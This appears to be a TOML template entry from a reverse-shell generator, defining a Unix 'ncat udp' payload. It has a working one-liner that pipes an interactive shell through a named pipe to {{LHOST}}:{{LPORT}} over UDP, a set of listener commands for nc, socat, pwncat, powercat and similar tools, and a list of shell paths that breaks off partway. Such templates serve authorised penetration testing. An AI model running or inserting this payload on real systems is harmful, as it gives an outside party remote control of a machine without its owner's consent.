id = "ncat_udp"
name = "ncat udp"
os = "unix"
type = "reverse"
proto = "udp"
lang = "sh"
description = "Creates a named pipe (FIFO) and uses netcat to connect to the specified host and port in the UDP protocol, redirecting IO through the FIFO for an interactive shell."

payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{{SHELL}} -i 2>&1|ncat -u {{LHOST}} {{LPORT}} >/tmp/f"

[listeners]
nc = "nc -luvnp {{LPORT}}"
nc_freebsd = "nc -luvn {{LPORT}}"
busybox_nc = "busybox nc -ulp {{LPORT}}"
ncat = "ncat -luvnp {{LPORT}}"
ncat_exe = "ncat.exe -luvnp {{LPORT}}"
rlwrap_nc = "rlwrap -cAr nc -luvnp {{LPORT}}"
rustcat = "rcat listen -u {{LPORT}}"
pwncat = "python3 -m pwncat -ulp {{LPORT}}"
socat = "socat -d -d UDP-LISTEN:{{LPORT}} STDOUT"
socat_tty = "socat -d -d file:`tty`,raw,echo=0 UDP-LISTEN:{{LPORT}}"
powercat = "powercat -l -p {{LPORT}} -u"

[shells]
compatible = [
	"/usr/bin/env bash", "bash", "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash", "/opt/homebrew/bin/bash", "/opt/local/bin/bash", "/snap/bin/bash", "/usr/sbin/bash", "/sbin/bash", "env bash",
	"/usr/bin/env sh", "sh", "/bin/sh", "/usr/bin/sh", "/usr/local/bin/sh", "/opt/homebrew/bin/sh", "/opt/local/bin/sh", "/snap/bin/sh", "/usr/sbin/sh", "/sbin/sh", "env sh",
	"/usr/bin/env dash", "dash", "/bin/dash", "/usr/bin/dash", "/usr/local/bin/dash", "/opt/homebrew/bin/dash", "/opt/local/bin/dash", "/snap/bin/dash", "/usr/sbin/dash", "/sbin/dash", "env dash",
	"/usr/bin/env ash", "ash", "/bin/ash", "/usr/bin/ash", "/usr/local/bin/ash", "/opt/homebrew/bin/ash", "/opt/local/bin/ash", "/snap/bin/ash", "/usr/sbin/ash", "/sbin/ash", "env ash", "busybox sh",
	"/usr/bin/env bsh", "bsh", "/bin/bsh", "/usr/bin/bsh", "/usr/local/bin/bsh", "/opt/homebrew/bin/bsh", "/opt/local/bin/bsh", "/snap/bin/bsh", "/usr/sbin/bsh", "/sbin/bsh", "env bsh",
	"/usr/bin/env csh", "csh", "/bin/csh", "/usr/bin/csh", "/usr/local/bin/csh", "/opt/homebrew/bin/csh", "/opt/local/bin/csh", "/snap/bin/csh", "/usr/sbin/csh", "/sbin/csh", "env csh",
	"/usr/bin/env tcsh", "tcsh", "/bin/tcsh", "/usr/bin/tcsh", "/usr/local/bin/tcsh", "/opt/homebrew/bin/tcsh", "/opt/local/bin/tcsh", "/snap/bin/tcsh", "/usr/sbin/tcsh", "/sbin/tcsh", "env tcsh",
	"/usr/bin/env ksh", "ksh", "/bin/ksh", "/usr/bin/ksh", "/usr/local/bin/ksh", "/opt/homebrew/bin/ksh", "/opt/local/bin/ksh", "/snap/bin/ksh", "/usr/sbin/ksh", "/sbin/ksh", "env ksh",
	"/usr/bin/env pdksh", "pdksh", "/bin/pdksh", "/usr/bin/pdksh", "/usr/local/bin/pdksh", "/opt/homebrew/bin/pdksh", "/opt/local/bin/pdksh", "/snap/bin/pdksh", "/usr/sbin/pdksh", "/sbin/pdksh", "env pdksh",
